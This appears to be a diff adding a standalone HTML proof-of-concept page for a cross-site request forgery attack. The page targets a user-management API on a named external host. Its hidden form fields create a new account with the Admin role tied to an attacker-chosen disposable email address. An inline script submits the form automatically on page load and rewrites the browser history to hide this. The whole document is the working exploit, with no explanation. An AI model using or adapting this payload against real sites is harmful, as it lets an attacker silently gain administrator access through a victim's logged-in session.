@@ -1,0 +1,27 @@
+<html>
+  <body>
+    <form action="https://sec.sporify.eu/api/services/app/user/CreateOrUpdateUser" method="POST">
+      <input type="hidden" name="user&#46;id" value="" />
+      <input type="hidden" name="user&#46;name" value="CSRF" />
+      <input type="hidden" name="user&#46;surname" value="CSRF" />
+      <input type="hidden" name="user&#46;userName" value="CSRF" />
+      <input type="hidden" name="user&#46;emailAddress" value="treddetagraute&#45;2889&#64;yopmail&#46;com" />
+      <input type="hidden" name="user&#46;phoneNumber" value="" />
+      <input type="hidden" name="user&#46;password" value="" />
+      <input type="hidden" name="user&#46;isActive" value="true" />
+      <input type="hidden" name="user&#46;shouldChangePasswordOnNextLogin" value="true" />
+      <input type="hidden" name="user&#46;isTwoFactorEnabled" value="true" />
+      <input type="hidden" name="user&#46;isLockoutEnabled" value="true" />
+      <input type="hidden" name="user&#46;passwordRepeat" value="" />
+      <input type="hidden" name="assignedRoleNames" value="Admin" />
+      <input type="hidden" name="assignedRoleNames" value="User" />
+      <input type="hidden" name="sendActivationEmail" value="true" />
+      <input type="hidden" name="setRandomPassword" value="true" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
